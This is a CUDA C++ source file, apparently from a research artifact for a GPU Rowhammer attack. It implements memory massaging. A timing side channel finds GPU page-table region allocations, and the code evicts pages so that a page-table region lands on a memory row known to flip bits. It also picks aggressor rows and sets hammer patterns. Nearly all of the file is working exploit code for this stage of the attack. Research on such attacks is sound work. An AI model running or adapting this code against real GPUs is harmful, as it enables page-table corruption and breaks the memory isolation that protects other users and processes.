#include "./s1_allocallmem.cuh"
#include "./s2_firstRegion.cuh"
#include <algorithm>
#include <chrono>
#include <cmath>
#include <cuda.h>
#include <fstream>
#include <iostream>
#include <numeric>
#include <random>
#include <rh_impls.cuh>
#include <rh_kernels.cuh>
#include <rh_utils.cuh>
#include <string>
#include <thread>

void
first_PT_region_test (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);

  GPUBreachContext ctx;
  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[3]);
  if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
    {
      printf ("Error: Memory Allocation is wrong\n");
      exit (1);
    }

  uint8_t *temp;
  size_t total_byte = get_memory_limit ();

  /**
   * 1. First allocation will be a 4KB data Page eviction
   * 2. Second eviction will be the PT Region allocation
   * 3. The 512th allocation will be a 4KB data Page eviction
   * 4. Step 2 + 508 (508 PT + 4 PD0s = 2MB) is the next PT Region allocation
   */
  uint64_t max_alloc_chunks = total_byte / ALLOC_SIZE;
  uint64_t next_id = max_alloc_chunks;
  for (uint64_t i = 0; i < max_alloc_chunks; i += 1)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE + 4 * KB);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      DBG_OUT << i << " New PT time: " << currentMS << " ms" << std::endl;

      // Skip timing spikes. At 512, there should be evictions (4KB * 512 =
      // 2MB)
      if (i < skip || i % 512 == 0)
        continue;

      // Found spike, set when the next spike will happen
      if (currentMS > threshold && next_id == max_alloc_chunks)
        {
          next_id = i + 508;
          std::cout << "Found First Allocation Spike: \033[1m" << i
                    << "\033[0m., Time: \033[1;31m" << " " << currentMS
                    << "\033[0m." << std::endl;
          std::cout << "Next Allocation Spike Id: \033[1m" << " " << next_id
                    << "\033[0m." << std::endl;
        }
      // Found subsequent spike and check if the side-channel prediction match
      else if (currentMS > threshold)
        {
          std::cout << "Expected: id\033[1;32m " << next_id
                    << "\033[0m. Found Spike id: ";
          next_id == i ? std::cout << "\033[1;32m" : std::cout << "\033[1;31m";
          std::cout << i << "\033[0m." << std::endl;
          return;
        }
    }
}

static uint64_t
load_rowhammer_bitflip_info (GPUBreachContext &ctx)
{
  uint8_t *temp;
  auto &alloc_ptrs = ctx.step1_data.alloc_ptrs;
  auto &agg_ptrs = ctx.step2_data.agg_ptrs;
  auto &agg_row_list = ctx.step2_data.agg_row_list;
  auto &agg_vec = ctx.step2_data.agg_vec;
  uint8_t *layout = (uint8_t *)alloc_ptrs[0];

  const uint64_t num_agg = ctx.bitflip_config.num_agg;
  const uint64_t step = ctx.bitflip_config.step;
  const uint64_t crit_agg = ctx.bitflip_config.crit_agg;
  const uint64_t vic_row = ctx.bitflip_config.vic_row;
  const uint64_t row_step = ctx.bitflip_config.row_step;
  const uint64_t num_rows = ctx.bitflip_config.num_rows;
  const bool left = ctx.bitflip_config.left;
  const uint64_t agg_pat
      = std::stoull (ctx.bitflip_config.agg_pat, nullptr, 16);

  const std::string HAMMER_ROOT = std::string (std::getenv ("HAMMER_ROOT"));

  if (HAMMER_ROOT == std::string ())
    {
      std::cout << "BREACH_ROOT is not set" << std::endl;
      return 1;
    }
  std::ifstream row_set_file (HAMMER_ROOT
                              + "/results/row_sets/"
                              + ctx.bitflip_config.row_set_file);
  RowList rows = read_row_from_file (row_set_file, layout);
  row_set_file.close ();

  std::vector<uint64_t> target_agg;
  std::vector<uint64_t> all_vics (num_rows);
  std::iota (all_vics.begin (), all_vics.end (), 0);

  /* Get Aggressor Rows for this bit-flip. Aggressors in Ascending order*/
  /*                     ← Left   Right →             */
  /* A       ...       crit_agg V crit_agg       ...       A */
  target_agg = get_aggressors_dir (rows, crit_agg, num_agg, row_step, left);
  std::vector<uint64_t> temp_vec;
  temp_vec.push_back (vic_row);

  // Calculate the start, end, and amount of the pages required for aggressor
  // rows
  uint64_t first_hammer_page
      = static_cast<uint64_t> (rows[target_agg[0]][0] - layout) / ALLOC_SIZE;
  uint64_t victim_page
      = static_cast<uint64_t> (rows[vic_row][0] - layout) / ALLOC_SIZE;
  uint64_t to_reserve
      = left ? victim_page - first_hammer_page
             : (static_cast<uint64_t> (rows[target_agg.back ()][0] - layout)
                / ALLOC_SIZE)
                   - victim_page; // Last page excluded.

  /**
   * Segragate aggressor row pages from the rest, using same insight as Paper
   * Section 4.3 Given our memory is full, freed physical memory is immediately
   * reused. We use this to conserve the memory for Rowhammer from the
   * massaging memory.
   */
  for (uint64_t i = 0; i < to_reserve; i++)
    {
      evict_from_device (alloc_ptrs[first_hammer_page + i], ALLOC_SIZE);
      cudaMallocManaged (&temp, ALLOC_SIZE);
      time_data_access (temp, ALLOC_SIZE);
      agg_ptrs.push_back (temp);
      DBG_OUT << first_hammer_page + i << '\n';
    }

  /* We reconfigure the aggressor row addresses using the new virtual addresses
   */
  auto row_agg_pair = get_new_rows(rows, target_agg, layout, agg_ptrs);
  set_rows (row_agg_pair.first, row_agg_pair.second, agg_pat, step);
  cudaDeviceSynchronize ();

  agg_row_list = row_agg_pair.first;
  agg_vec = row_agg_pair.second;
  if (!left)
    std::reverse (agg_vec.begin (), agg_vec.end ());

  return victim_page;
}

bool
first_PT_region (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);
  GPUBreachContext ctx;
  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[3]);

  return first_PT_region (num_alloc_init, threshold, skip, ctx);
}

bool
first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip,
                 GPUBreachContext &ctx)
{
  if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
    {
      std::cout << "Error: Memory Allocation is wrong" << "\n";
      exit (1);
    }

  auto &alloc_ptrs = ctx.step1_data.alloc_ptrs;
  auto victim_page = load_rowhammer_bitflip_info (ctx);

  /****************************************************************/
  /* Step 2 of Paper: Massaging first PT Region to Flippy Memory */
  /****************************************************************/
  uint8_t *temp;
  std::vector<uint8_t *> misc_ptrs;
  uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
  uint64_t next_id = ERR_next_id;

  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      // Evict vicimt page to create free space for PT Region
      if (i == next_id)
        evict_from_device (alloc_ptrs[victim_page], ALLOC_SIZE);

      // Generating 2MB + 4KB pages
      cudaMallocManaged (&temp, ALLOC_SIZE + 4 * KB);

      // Only trigger 4KB allocation to save memory.
      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      DBG_OUT << i << " New PT time: " << currentMS << " ms" << std::endl;

      misc_ptrs.push_back (temp);
      if (i < skip || i % 512 == 0)
        continue;

      // PT region now in the victim page, can break.
      if (i == next_id)
        break;

      // Found spike, set when the next spike will happen.
      if (currentMS > threshold && next_id == ERR_next_id)
        next_id = i + 508;
    }

  if (debug_enabled ())
    {
      std::cout << "(Step 2 Done) First PT Region Generated: Press "
                   "\033[1;32mEnter Key\033[0m to continue... "
                << '\n';
      paused ();
    }
  else
    {
      std::cout << "(Step 2 Done) First PT Region Generated\n";
    }

  /****************************************************************/

  /* Free up GPU/CPU memory by releasing the evicted memories and prior
   * memories */
  cudaFree (alloc_ptrs[0]);
  alloc_ptrs.clear ();

  for (uint64_t i = 0; i < next_id; i += 1)
    cudaFree (misc_ptrs[i]);
  misc_ptrs.clear ();
  /****************************************************************/

  return true;
}
